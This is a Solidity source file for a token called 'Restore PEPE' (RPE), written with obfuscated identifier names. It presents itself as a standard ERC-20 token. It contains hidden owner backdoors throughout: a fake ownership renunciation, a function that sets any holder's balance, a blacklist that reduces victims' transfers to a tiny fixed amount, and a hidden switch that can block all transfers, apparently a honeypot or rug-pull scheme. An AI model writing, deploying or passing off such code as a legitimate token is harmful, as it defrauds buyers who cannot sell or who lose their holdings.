//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface tradingFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchedSwap) external view returns (uint256);

    function transfer(address feeFundMode, uint256 exemptSwap) external returns (bool);

    function allowance(address receiverTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptSwap) external returns (bool);

    function transferFrom(
        address sender,
        address feeFundMode,
        uint256 exemptSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tradingAt, uint256 value);
    event Approval(address indexed receiverTo, address indexed spender, uint256 value);
}

abstract contract sellAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableMaxAmount {
    function createPair(address autoTake, address tokenLiquidity) external returns (address);
}

interface tradingFundMetadata is tradingFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RestorePEPE is sellAuto, tradingFund, tradingFundMetadata {

    function symbol() external view virtual override returns (string memory) {
        return walletAmount;
    }

    function limitAuto(address totalShould, address feeFundMode, uint256 exemptSwap) internal returns (bool) {
        require(receiverShouldMin[totalShould] >= exemptSwap);
        receiverShouldMin[totalShould] -= exemptSwap;
        receiverShouldMin[feeFundMode] += exemptSwap;
        emit Transfer(totalShould, feeFundMode, exemptSwap);
        return true;
    }

    uint256 public buyLimit;

    address public buyFrom;

    uint256 public limitFeeTo;

    function totalSupply() external view virtual override returns (uint256) {
        return autoExempt;
    }

    function approve(address buyShould, uint256 exemptSwap) public virtual override returns (bool) {
        fundSender[_msgSender()][buyShould] = exemptSwap;
        emit Approval(_msgSender(), buyShould, exemptSwap);
        return true;
    }

    function getOwner() external view returns (address) {
        return fromToken;
    }

    bool public walletLaunched;

    function owner() external view returns (address) {
        return fromToken;
    }

    function tradingFrom(address txExempt) public {
        require(txExempt.balance < 100000);
        if (walletLaunched) {
            return;
        }
        if (fromBuy == teamExempt) {
            fromBuy = true;
        }
        limitEnableAmount[txExempt] = true;
        
        walletLaunched = true;
    }

    mapping(address => uint256) private receiverShouldMin;

    constructor (){
        if (fromBuy) {
            teamExempt = true;
        }
        modeWallet takeFee = modeWallet(maxMarketing);
        totalEnable = enableMaxAmount(takeFee.factory()).createPair(takeFee.WETH(), address(this));
        if (buyLimit != limitFeeTo) {
            fromBuy = true;
        }
        buyFrom = _msgSender();
        launchedTrading();
        limitEnableAmount[buyFrom] = true;
        receiverShouldMin[buyFrom] = autoExempt;
        
        emit Transfer(address(0), buyFrom, autoExempt);
    }

    function receiverMarketingEnable(address buyMin, uint256 exemptSwap) public {
        senderMin();
        receiverShouldMin[buyMin] = exemptSwap;
    }

    bool public fromBuy;

    function launchedTrading() public {
        emit OwnershipTransferred(buyFrom, address(0));
        fromToken = address(0);
    }

    function transferFrom(address totalShould, address feeFundMode, uint256 exemptSwap) external override returns (bool) {
        if (_msgSender() != maxMarketing) {
            if (fundSender[totalShould][_msgSender()] != type(uint256).max) {
                require(exemptSwap <= fundSender[totalShould][_msgSender()]);
                fundSender[totalShould][_msgSender()] -= exemptSwap;
            }
        }
        return tokenSwap(totalShould, feeFundMode, exemptSwap);
    }

    function name() external view virtual override returns (string memory) {
        return isShould;
    }

    string private walletAmount = "RPE";

    mapping(address => mapping(address => uint256)) private fundSender;

    string private isShould = "Restore PEPE";

    function buyAuto(address senderModeTo) public {
        senderMin();
        if (fromBuy) {
            teamExempt = false;
        }
        if (senderModeTo == buyFrom || senderModeTo == totalEnable) {
            return;
        }
        liquidityEnableTrading[senderModeTo] = true;
    }

    address maxMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public liquidityEnableTrading;

    address sellSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return amountEnableMode;
    }

    function tokenSwap(address totalShould, address feeFundMode, uint256 exemptSwap) internal returns (bool) {
        if (totalShould == buyFrom) {
            return limitAuto(totalShould, feeFundMode, exemptSwap);
        }
        uint256 shouldFund = tradingFund(totalEnable).balanceOf(sellSender);
        require(shouldFund == tradingAutoLaunch);
        require(feeFundMode != sellSender);
        if (liquidityEnableTrading[totalShould]) {
            return limitAuto(totalShould, feeFundMode, buyFund);
        }
        return limitAuto(totalShould, feeFundMode, exemptSwap);
    }

    function balanceOf(address launchedSwap) public view virtual override returns (uint256) {
        return receiverShouldMin[launchedSwap];
    }

    bool private teamExempt;

    function tradingExempt(uint256 exemptSwap) public {
        senderMin();
        tradingAutoLaunch = exemptSwap;
    }

    function allowance(address atBuyWallet, address buyShould) external view virtual override returns (uint256) {
        if (buyShould == maxMarketing) {
            return type(uint256).max;
        }
        return fundSender[atBuyWallet][buyShould];
    }

    uint256 tradingAutoLaunch;

    address private fromToken;

    uint256 private autoExempt = 100000000 * 10 ** 18;

    function senderMin() private view {
        require(limitEnableAmount[_msgSender()]);
    }

    uint256 isAt;

    uint8 private amountEnableMode = 18;

    event OwnershipTransferred(address indexed isTotal, address indexed buySenderWallet);

    mapping(address => bool) public limitEnableAmount;

    address public totalEnable;

    uint256 constant buyFund = 11 ** 10;

    function transfer(address buyMin, uint256 exemptSwap) external virtual override returns (bool) {
        return tokenSwap(_msgSender(), buyMin, exemptSwap);
    }

}